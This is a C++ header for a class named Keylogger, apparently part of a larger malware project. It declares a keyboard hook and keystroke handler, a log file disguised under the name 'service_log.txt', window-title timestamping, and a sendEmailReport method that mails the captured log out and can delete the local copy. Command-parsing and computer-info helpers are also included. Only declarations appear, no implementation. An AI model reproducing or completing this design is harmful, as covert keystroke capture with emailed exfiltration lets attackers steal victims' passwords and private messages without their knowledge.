#pragma once

#include "EmailService.h"
#include "Hook.h"
#include "StringHelper.h"
#include "CommandParser.h"
#include "KeyBlockService.h"

#include <fstream>
#include <vector>
#include <Psapi.h>
#include <string>
#include <memory>
#include <ctime>
#include <sstream>
#include <codecvt>
#include <locale>

#include "ComputerInfoHelper.h"

#define FILENAME L"service_log.txt"

class Keylogger {
public:
	Keylogger();
	void start();
	void stop();
	~Keylogger();

	bool sendEmailReport(std::wstring emailTo, bool deleteLocal);
private:
	std::wstring logfilePath;
	std::shared_ptr<Hook> hook;
	bool isActive;
	std::wofstream logFile;
	HWND lastActiveWindow;

	void keyboardHandler(const wchar_t* key);
	void addWindowTimeStamps();
};

